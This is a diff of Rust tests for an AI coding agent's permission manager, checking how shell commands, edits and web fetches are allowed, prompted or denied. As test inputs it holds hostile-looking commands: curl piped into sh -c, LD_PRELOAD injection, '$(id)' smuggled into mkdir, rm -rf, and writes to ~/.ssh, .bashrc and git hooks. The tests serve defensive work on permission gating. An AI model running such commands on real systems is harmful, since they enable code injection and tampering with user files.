                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
                 for cmd in ["my-custom-build --release", "second-custom-tool"] {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
                     assert_eq!(d, Decision::Allow);
                 }
                 let seen = seen.lock().unwrap();
@@ -4353,28 +4762,22 @@ mod tests {
                     ClientType::Generic,
                     true,
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Cancelled);
                 mgr.set_auto_mode(true);
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("post-cancel-tool".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("post-cancel-tool".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Allow);
                 assert!(
                     seen.lock().unwrap()[0].turns.is_empty(),
@@ -4384,28 +4787,22 @@ mod tests {
                 let tmp2 = tempfile::tempdir().unwrap();
                 let cwd2 = AbsPathBuf::new(tmp2.path().to_path_buf()).unwrap();
                 let (mgr2, _e2) = test_manager(&cwd2, false, None);
-                let d = mgr2
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr2,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
                 mgr2.set_auto_mode(true);
                 let (clf2, seen2) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr2.set_classifier(Some(clf2));
-                let d = mgr2
-                    .request(
-                        AccessKind::Bash("post-error-tool".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr2,
+                    AccessKind::Bash("post-error-tool".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Allow);
                 assert!(
                     seen2.lock().unwrap()[0].turns.is_empty(),
@@ -4431,28 +4828,14 @@ mod tests {
                     true,
                 );
                 for i in 0..=MAX_RECORDED_PERMISSION_DECISIONS {
-                    let d = mgr
-                        .request(
-                            AccessKind::Bash(format!("custom-tool-{i} --run")),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
+                    let d = decide(&mgr, AccessKind::Bash(format!("custom-tool-{i} --run")), tool_call())
                         .await;
                     assert_eq!(d, Decision::Allow);
                 }
                 mgr.set_auto_mode(true);
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("capstone-tool".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
+                let d = decide(&mgr, AccessKind::Bash("capstone-tool".into()), tool_call())
                     .await;
                 assert_eq!(d, Decision::Allow);
 
@@ -4497,30 +4880,19 @@ mod tests {
                     true,
                 );
                 mgr.set_classifier_transcript(vec![ClassifierTurn::UserText("first".into())]);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Allow);
 
                 mgr.set_classifier_transcript(vec![ClassifierTurn::UserText("second".into())]);
                 mgr.set_auto_mode(true);
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("another-tool".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("another-tool".into()), tool_call()).await;
                 assert_eq!(d, Decision::Allow);
 
                 let seen = seen.lock().unwrap();
@@ -4568,7 +4940,7 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(AccessKind::Bash("ls".into()), tool_call(), None, None, None),
+                    decide(&mgr, AccessKind::Bash("ls".into()), tool_call()),
                 )
                 .await
                 .expect("permission request must resolve, not hang");
@@ -4610,15 +4982,12 @@ mod tests {
                 let (mgr, mut events) =
                     manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
 
-                let decision = mgr
-                    .request(
-                        AccessKind::Bash("OUT=$(echo hi); echo \"$OUT\"".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let decision = decide(
+                    &mgr,
+                    AccessKind::Bash("OUT=$(echo hi); echo \"$OUT\"".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(decision, Decision::Reject(_)));
                 let event = events.try_recv().expect("event must be emitted");
                 assert_eq!(
@@ -4650,15 +5019,8 @@ mod tests {
                 let (mgr, mut events) =
                     manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
 
-                let decision = mgr
-                    .request(
-                        AccessKind::Bash("cat notes.txt".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let decision =
+                    decide(&mgr, AccessKind::Bash("cat notes.txt".into()), tool_call()).await;
                 assert!(matches!(decision, Decision::Reject(_)));
                 let event = events.try_recv().expect("event must be emitted");
                 assert_eq!(
@@ -4709,7 +5071,7 @@ mod tests {
         async fn request(mgr: &PermissionHandle, access: AccessKind) -> Decision {
             tokio::time::timeout(
                 std::time::Duration::from_secs(5),
-                mgr.request(access, tool_call(), None, None, None),
+                decide(mgr, access, tool_call()),
             )
             .await
             .expect("permission request must resolve, not hang")
@@ -4826,6 +5188,106 @@ mod tests {
                         Some(reasons::AUTO_CLASSIFIER_DENY)
                     );
                     assert_eq!(ev.auto_denials_total, Some(1));
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn interactive_classifier_block_prompts_instead_of_silent_deny() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let blocked = [
+                        AccessKind::Bash("git push -u origin HEAD".into()),
+                        AccessKind::MCPTool {
+                            name: "linear__save_issue".into(),
+                            input: serde_json::json!({"id": "GB-5346", "state": "In Progress"}),
+                        },
+                        AccessKind::WebFetch("https://example.test/api".into()),
+                    ];
+                    let interactive = [
+                        ClientType::GrokPager,
+                        ClientType::Desktop,
+                        ClientType::Extension,
+                        ClientType::GrokWeb,
+                    ];
+                    for client_type in interactive {
+                        assert!(
+                            client_type.can_present_permission_prompt(),
+                            "{client_type:?}"
+                        );
+                        let tmp = tempfile::tempdir().unwrap();
+                        let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                        let client = RecordingClient::default();
+                        let prompts = client.prompts.clone();
+                        let (mgr, mut events) =
+                            manager_with_recording_client(&cwd, None, client, client_type);
+                        mgr.set_auto_mode(true);
+
+                        let (allow, _) = capturing_classifier(ClassifierVerdict::Allow);
+                        mgr.set_classifier(Some(allow));
+                        let allowed = request(&mgr, AccessKind::Bash("git status".into())).await;
+                        assert!(
+                            matches!(allowed, Decision::Allow),
+                            "{client_type:?}: {allowed:?}"
+                        );
+                        assert_eq!(prompts.borrow().len(), 0, "{client_type:?}");
+                        let _ = events.try_recv();
+
+                        let (block, _) = capturing_classifier(ClassifierVerdict::Block);
+                        mgr.set_classifier(Some(block));
+
+                        for (i, access) in blocked.iter().cloned().enumerate() {
+                            let d = request(&mgr, access).await;
+                            assert!(
+                                matches!(d, Decision::Reject(_)),
+                                "{client_type:?} Block must prompt, got {d:?}"
+                            );
+                            assert_eq!(
+                                prompts.borrow().len(),
+                                i + 1,
+                                "{client_type:?} prompt count"
+                            );
+                            let ev = events.try_recv().expect("event");
+                            assert_eq!(
+                                ev.decision_reason.as_deref(),
+                                Some(reasons::AUTO_CLASSIFIER_DENY),
+                                "{client_type:?}"
+                            );
+                            assert!(ev.user_prompted, "{client_type:?}");
+                        }
+                    }
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn headless_classifier_block_still_denies_without_prompt() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) =
+                        manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+                    mgr.set_auto_mode(true);
+                    let (clf, _) = capturing_classifier(ClassifierVerdict::Block);
+                    mgr.set_classifier(Some(clf));
+
+                    let d = request(&mgr, AccessKind::Bash("git push -u origin HEAD".into())).await;
+                    assert!(
+                        matches!(d, Decision::PolicyDeny(_)),
+                        "headless Block must deny-and-continue, got {d:?}"
+                    );
+                    assert_eq!(prompts.borrow().len(), 0);
+                    let ev = events.try_recv().expect("event");
+                    assert_eq!(
+                        ev.decision_reason.as_deref(),
+                        Some(reasons::AUTO_CLASSIFIER_DENY)
+                    );
+                    assert!(!ev.user_prompted);
                 })
                 .await;
         }
@@ -4998,14 +5460,10 @@ mod tests {
 
                     let resolution = tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request_with_path_context_resolved(
+                        mgr.request_with_context(PermissionRequest::new(
                             AccessKind::Bash("bash -c \"$X\"".into()),
                             tool_call(),
-                            None,
-                            None,
-                            None,
-                            None,
-                        ),
+                        )),
                     )
                     .await
                     .expect("request must resolve");
@@ -5058,7 +5516,7 @@ mod tests {
                     &cwd,
                     Some(armed_bash_config()),
                     SelectingClient::new(select_allow),
-                    ClientType::GrokPager,
+                    ClientType::Generic,
                     true,
                 );
                 mgr.set_auto_mode(true);
@@ -5070,7 +5528,7 @@ mod tests {
                 for _ in 0..AUTO_DENY_CONSECUTIVE_LIMIT {
                     let d = tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request(bash(), tool_call(), None, None, None),
+                        decide(&mgr, bash(), tool_call()),
                     )
                     .await
                     .expect("in-budget deny resolves");
@@ -5081,7 +5539,7 @@ mod tests {
                 let expected_tool_id = update.tool_call_id.to_string();
                 let resolution = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request_with_path_context_resolved(bash(), update, None, None, None, None),
+                    mgr.request_with_context(PermissionRequest::new(bash(), update)),
                 )
                 .await
                 .expect("escalated prompt resolves");
@@ -5401,6 +5859,55 @@ mod tests {
         /// A user-configured allowlist is explicit intent and keeps
         /// short-circuiting the classifier in auto mode.
         #[tokio::test]
+        async fn default_web_fetch_allowlist_survives_classifier_unavailability() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let default_domains: Vec<String> = DEFAULT_ALLOWED_DOMAINS
+                        .iter()
+                        .map(|d| (*d).to_owned())
+                        .collect();
+                    let host = DEFAULT_ALLOWED_DOMAINS
+                        .iter()
+                        .find(|d| !d.contains('/'))
+                        .expect("default allowlist has a host-only entry");
+                    let url = format!("https://{host}/status");
+
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) =
+                        manager_with_web_domains(&cwd, client, default_domains.clone());
+                    mgr.set_auto_mode(true);
+                    let (clf, _seen) = capturing_classifier(ClassifierVerdict::Unavailable);
+                    mgr.set_classifier(Some(clf));
+
+                    let d = request(&mgr, AccessKind::WebFetch(url)).await;
+                    assert!(matches!(d, Decision::Allow), "{d:?}");
+                    assert_eq!(
+                        prompts.borrow().len(),
+                        0,
+                        "default-listed domain must not prompt when the classifier is absent"
+                    );
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(
+                        ev.decision_reason.as_deref(),
+                        Some(reasons::STATIC_ALLOWLIST)
+                    );
+
+                    let d = request(
+                        &mgr,
+                        AccessKind::WebFetch("https://not-on-any-list.example/x".into()),
+                    )
+                    .await;
+                    assert!(matches!(d, Decision::Reject(_)), "{d:?}");
+                    assert_eq!(prompts.borrow().len(), 1);
+                })
+                .await;
+        }
+
+        #[tokio::test]
         async fn user_configured_web_fetch_allowlist_still_short_circuits() {
             let local = tokio::task::LocalSet::new();
             local
@@ -5448,12 +5955,10 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::Bash("source ./setup.sh".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -5479,18 +5984,142 @@ mod tests {
                 let (mgr, _e) =
                     manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
 
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("source ./setup.sh".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("source ./setup.sh".into()),
+                    tool_call(),
+                )
+                .await;
 
                 assert!(matches!(d, Decision::PolicyDeny(_)), "got {d:?}");
                 assert!(prompts.borrow().is_empty(), "dontAsk must not prompt");
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn sourced_script_always_allow_approves_without_prompt() {
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                let mut config = crate::permission::types::PermissionConfig::new(vec![]);
+                config.prompt_policy = PromptPolicy::Allow;
+                let client = RecordingClient::default();
+                let prompts = client.prompts.clone();
+                let (mgr, _e) =
+                    manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
+
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("source ./setup.sh".into()),
+                    tool_call(),
+                )
+                .await;
+
+                assert!(matches!(d, Decision::Allow), "got {d:?}");
+                assert!(prompts.borrow().is_empty(), "alwaysAllow must not prompt");
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn always_allow_cannot_bypass_managed_pin() {
+        tokio::task::LocalSet::new()
+            .run_until(async {
+                let temporary = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(temporary.path().to_path_buf()).unwrap();
+                let mut config = crate::permission::types::PermissionConfig::new(vec![]);
+                config.prompt_policy = PromptPolicy::Allow;
+                let (sender, receiver) = mpsc::unbounded_channel();
+                let (manager, _events) = spawn_permission_manager_with_pin(
+                    acp::SessionId::new(Arc::from("test-session")),
+                    GatewaySender::new(sender),
+                    cwd,
+                    ClientType::Generic,
+                    Some(config),
+                    vec![],
+                    vec![],
+                    false,
+                    None,
+                    true,
+                    Some(PIN),
+                    None,
+                );
+                drop(receiver);
+                let decision = decide(
+                    &manager,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    tool_call(),
+                )
+                .await;
+                assert!(!matches!(decision, Decision::Allow));
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn always_allow_cannot_bypass_shell_file_ask() {
+        tokio::task::LocalSet::new()
+            .run_until(async {
+                let temporary = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(temporary.path().to_path_buf()).unwrap();
+                let rule = crate::permission::rules::parse_permission_rule(
+                    "Edit(**/protected.txt)",
+                    crate::permission::types::RuleAction::Ask,
+                )
+                .unwrap();
+                let mut config = crate::permission::types::PermissionConfig::new(vec![rule]);
+                config.prompt_policy = PromptPolicy::Allow;
+                let client = RecordingClient::default();
+                let prompts = client.prompts.clone();
+                let (manager, _events) = manager_with_recording_client(
+                    &cwd,
+                    Some(config),
+                    client,
+                    ClientType::GrokPager,
+                );
+                let decision = decide(
+                    &manager,
+                    AccessKind::Bash("printf changed > protected.txt".into()),
+                    tool_call(),
+                )
+                .await;
+                assert!(!matches!(decision, Decision::Allow));
+                assert_eq!(prompts.borrow().len(), 1);
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn always_allow_does_not_override_deny_rule() {
+        use crate::permission::rules::parse_permission_rule;
+
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                let rule = parse_permission_rule(
+                    "Bash(rm -rf *)",
+                    crate::permission::types::RuleAction::Deny,
+                )
+                .unwrap();
+                let mut config = crate::permission::types::PermissionConfig::new(vec![rule]);
+                config.prompt_policy = PromptPolicy::Allow;
+                let client = RecordingClient::default();
+                let prompts = client.prompts.clone();
+                let (mgr, _e) =
+                    manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
+
+                let d = decide(&mgr, AccessKind::Bash("rm -rf /tmp/x".into()), tool_call()).await;
+
+                assert!(
+                    matches!(d, Decision::PolicyDeny(_)),
+                    "deny rule must win over alwaysAllow, got {d:?}"
+                );
+                assert!(prompts.borrow().is_empty());
             })
             .await;
     }
@@ -5516,7 +6145,7 @@ mod tests {
                 let cmd = "curl http://example.com && sh -c 'echo hi'";
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None),
+                    decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()),
                 )
                 .await
                 .expect("permission request must resolve, not hang");
@@ -5543,9 +6172,7 @@ mod tests {
         config.prompt_policy = policy;
         let (mgr, _events) =
             manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
-        let decision = mgr
-            .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-            .await;
+        let decision = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
         let count = prompts.borrow().len();
         (decision, count)
     }
@@ -5587,14 +6214,139 @@ mod tests {
                 let (mgr, _events) =
                     manager_with_recording_client(&cwd, Some(config), client, ClientType::Generic);
                 for cmd in ["cat payload > out", UNSAFE_GIT_STATUS] {
-                    let decision = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-                        .await;
+                    let decision = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
                     assert!(matches!(decision, Decision::Reject(_)), "{cmd}");
                 }
                 assert_eq!(prompts.borrow().len(), 2);
             })
             .await;
+    }
+
+    #[test]
+    fn evaluate_bash_pins_redirect_write_provenance() {
+        let state = PermissionState::default();
+        assert!(!evaluate_bash("touch CANARY", &state, true).redirect_write);
+        assert!(evaluate_bash("cat payload > out", &state, true).redirect_write);
+        assert!(evaluate_bash("touch CANARY > $OUT", &state, true).redirect_write);
+        assert!(!evaluate_bash("cat payload > /dev/null", &state, true).redirect_write);
+    }
+
+    #[tokio::test]
+    async fn narrow_bash_allow_clears_word_visible_write_floor() {
+        use crate::permission::rules::parse_permission_rule;
+        use crate::permission::types::{PermissionConfig, RuleAction};
+
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                for prompt_policy in [PromptPolicy::Ask, PromptPolicy::Deny] {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let rule = parse_permission_rule("Bash(cp:*)", RuleAction::Allow).unwrap();
+                    let mut config = PermissionConfig::new(vec![rule]);
+                    config.prompt_policy = prompt_policy;
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
+                    let d = decide(&mgr, AccessKind::Bash("cp src dst".into()), tool_call()).await;
+                    assert_eq!(
+                        d,
+                        Decision::Allow,
+                        "narrow allow must clear the write floor ({prompt_policy:?})"
+                    );
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::POLICY_ALLOW));
+                    assert!(!ev.user_prompted);
+                    assert_eq!(prompts.borrow().len(), 0, "{prompt_policy:?}");
+                }
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn narrow_bash_allow_does_not_clear_invisible_or_mixed_floors() {
+        use crate::permission::rules::parse_permission_rule;
+        use crate::permission::types::{PermissionConfig, RuleAction};
+
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let cases = [
+                    ("Bash(cat:*)", "cat payload > out"),
+                    ("Bash(touch:*)", "touch CANARY > $OUT"),
+                    ("Bash(touch:*)", "LD_PRELOAD=/x/e.so touch CANARY"),
+                    ("Bash(*)", "cp src dst"),
+                ];
+                for (rule_str, cmd) in cases {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let rule = parse_permission_rule(rule_str, RuleAction::Allow).unwrap();
+                    let config = PermissionConfig::new(vec![rule]);
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
+                    assert!(
+                        matches!(d, Decision::Reject(_)),
+                        "{rule_str} + {cmd} must stay floored, got {d:?}"
+                    );
+                    assert_eq!(prompts.borrow().len(), 1, "{rule_str} + {cmd}");
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert!(ev.user_prompted, "{rule_str} + {cmd}");
+                    assert_ne!(
+                        ev.decision_reason.as_deref(),
+                        Some(reasons::POLICY_ALLOW),
+                        "{rule_str} + {cmd}"
+                    );
+                }
+            })
+            .await;
+    }
+
+    #[test]
+    fn mkdir_and_touch_auto_allow_as_safe_creation() {
+        let state = PermissionState::default();
+        for cmd in [
+            "mkdir -p build/out",
+            "touch notes.md",
+            "mkdir a && touch a/b",
+        ] {
+            let e = evaluate_bash(cmd, &state, true);
+            assert!(
+                !e.assessment.contains(ClassifierSecurityFinding::FileWrite),
+                "{cmd}: creation must not be a FileWrite"
+            );
+            assert!(
+                !bash_request_floor_requires_prompt(Some(&e)),
+                "{cmd}: creation must not floor"
+            );
+            assert!(
+                matches!(e.segments, SegmentEvaluation::AutoAllow { .. }),
+                "{cmd}: must auto-allow, got {:?}",
+                e.segments
+            );
+        }
+        for cmd in [
+            "touch a > b",
+            "mkdir \"$(id)\"",
+            "LD_PRELOAD=/x/e.so touch CANARY",
+            "rm -rf build",
+        ] {
+            let e = evaluate_bash(cmd, &state, true);
+            let gated = bash_request_floor_requires_prompt(Some(&e))
+                || !matches!(e.segments, SegmentEvaluation::AutoAllow { .. });
+            assert!(gated, "{cmd}: must stay gated, got {:?}", e.segments);
+        }
     }
 
     /// HackerOne #3876332: a managed `Bash(git:*)` allow must not auto-approve a
@@ -5628,13 +6380,7 @@ mod tests {
                 for cmd in ["git status", "timeout 1 git status"] {
                     let d = tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request(
-                            AccessKind::Bash(cmd.into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        ),
+                        decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()),
                     )
                     .await
                     .expect("permission request must resolve, not hang");
@@ -5648,13 +6394,7 @@ mod tests {
                 for cmd in ["git remote -v", "timeout 1 git remote -v"] {
                     let d = tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request(
-                            AccessKind::Bash(cmd.into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        ),
+                        decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()),
                     )
                     .await
                     .expect("permission request must resolve, not hang");
@@ -5692,13 +6432,7 @@ mod tests {
                     let before = prompts.borrow().len();
                     let d = tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request(
-                            AccessKind::Bash(cmd.into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        ),
+                        decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()),
                     )
                     .await
                     .expect("permission request must resolve, not hang");
@@ -5732,7 +6466,7 @@ mod tests {
                 let cmd = "bash -c 'git status && id'";
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None),
+                    decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()),
                 )
                 .await
                 .expect("permission request must resolve, not hang");
@@ -5796,15 +6530,12 @@ mod tests {
                 let client = RecordingClient::default();
                 let (mgr, mut events) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cat payload > out".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("cat payload > out".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(d, Decision::Reject(_)));
                 let ev = events.try_recv().expect("event must be emitted");
                 assert_eq!(ev.decision_reason.as_deref(), Some("bash_request_floor"));
@@ -5834,9 +6565,7 @@ mod tests {
                     "PYTHONPATH=/x python s.py",
                     "out=$(gh pr view 3135); echo \"$out\"",
                 ] {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
                     assert!(matches!(d, Decision::Allow), "{cmd}: {d:?}");
                     let ev = events.try_recv().expect("event must be emitted");
                     assert_eq!(
@@ -5878,9 +6607,7 @@ mod tests {
                     "env -i git status",
                 ] {
                     let before = seen.lock().unwrap().len();
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
                     assert!(matches!(d, Decision::Allow), "{cmd}: {d:?}");
                     assert!(
                         seen.lock().unwrap()[before]
@@ -5925,8 +6652,7 @@ mod tests {
                     "env bash -c 'echo hi'",
                 ] {
                     let before = seen.lock().unwrap().len();
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call())
                         .await;
                     assert!(matches!(d, Decision::Allow), "{cmd}: {d:?}");
                     assert!(
@@ -5959,15 +6685,12 @@ mod tests {
                 let (mgr, mut events) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
                 mgr.set_yolo_mode(true);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash(UNSAFE_GIT_STATUS.into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash(UNSAFE_GIT_STATUS.into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(d, Decision::Allow), "{d:?}");
                 let ev = events.try_recv().expect("event must be emitted");
                 assert_eq!(ev.decision_reason.as_deref(), Some("yolo"));
@@ -5994,15 +6717,12 @@ mod tests {
                 mgr.set_classifier(Some(LlmPermissionClassifier::with_fixed_model_text(
                     r#"{"thinking":"risky sink","shouldBlock":true,"reason":"no"}"#,
                 )));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cat payload > out".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("cat payload > out".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(d, Decision::PolicyDeny(_)), "{d:?}");
                 let ev = events.try_recv().expect("event must be emitted");
                 assert_eq!(ev.decision_reason.as_deref(), Some("auto_classifier_deny"));
@@ -6021,8 +6741,8 @@ mod tests {
             .run_until(async {
                 for path in [
                     "/etc/hosts",
-                    "/home/user/.grok/hooks/evil.json",
-                    "/home/user/.grok/sandbox.toml",
+                    "/home/user/.opengrok/hooks/evil.json",
+                    "/home/user/.opengrok/sandbox.toml",
                 ] {
                     let mut auto = crate::permission::types::PermissionConfig::new(vec![]);
                     auto.prompt_policy = PromptPolicy::Auto;
@@ -6051,9 +6771,8 @@ mod tests {
                             client,
                             ClientType::Generic,
                         );
-                        let decision = mgr
-                            .request(AccessKind::Edit(path.into()), tool_call(), None, None, None)
-                            .await;
+                        let decision =
+                            decide(&mgr, AccessKind::Edit(path.into()), tool_call()).await;
                         assert_eq!(prompts.borrow().len(), expected_prompts, "{name} {path}");
                         if policy_deny {
                             assert!(matches!(decision, Decision::PolicyDeny(_)), "{name} {path}");
@@ -6061,6 +6780,58 @@ mod tests {
                             assert!(matches!(decision, Decision::Reject(_)), "{name} {path}");
                         }
                     }
+                }
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn protected_creation_floor_gates_mkdir_touch() {
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                for cmd in [
+                    "touch /etc/hosts",
+                    "mkdir /home/user/.ssh",
+                    "touch /home/user/.bashrc",
+                    "touch /home/user/.git/hooks/pre-commit",
+                    "cd /etc && touch hosts",
+                ] {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let mut config = crate::permission::types::PermissionConfig::new(vec![]);
+                    config.prompt_policy = PromptPolicy::Auto;
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, _events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
